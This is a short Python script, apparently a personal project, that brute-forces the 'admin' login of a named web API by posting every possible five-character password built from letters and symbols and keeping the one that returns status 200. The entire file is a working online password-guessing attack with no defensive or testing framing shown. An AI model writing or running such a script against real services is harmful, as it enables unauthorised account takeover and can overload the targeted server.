import requests

class brute_force:
    def __init__(self):
        self.endpoint = "https://mlcasim-api.edwardnafornita.com"
        self.passwordLength = 5
        self.possibleChars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '.', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '[', ']', '{', '}', '|', ';', ':', ',', '<', '>', '/', '?']
        self.successful_password = ""

    def run(self):
        for a in range(len(self.possibleChars)):
            first_char = self.possibleChars[a]
            for b in range(len(self.possibleChars)):
                second_char = self.possibleChars[b]
                for c in range(len(self.possibleChars)):
                    third_char = self.possibleChars[c]
                    for d in range(len(self.possibleChars)):
                        fourth_char = self.possibleChars[d]
                        for e in range(len(self.possibleChars)):
                            fifth_char = self.possibleChars[e]
                            password = first_char + second_char + third_char + fourth_char + fifth_char

                            payload = {
                                "username": "admin",
                                "password": password
                            }

                            response = requests.post(self.endpoint, json=payload)

                            print(response)

                            if response.status_code == 200:
                                self.successful_password = password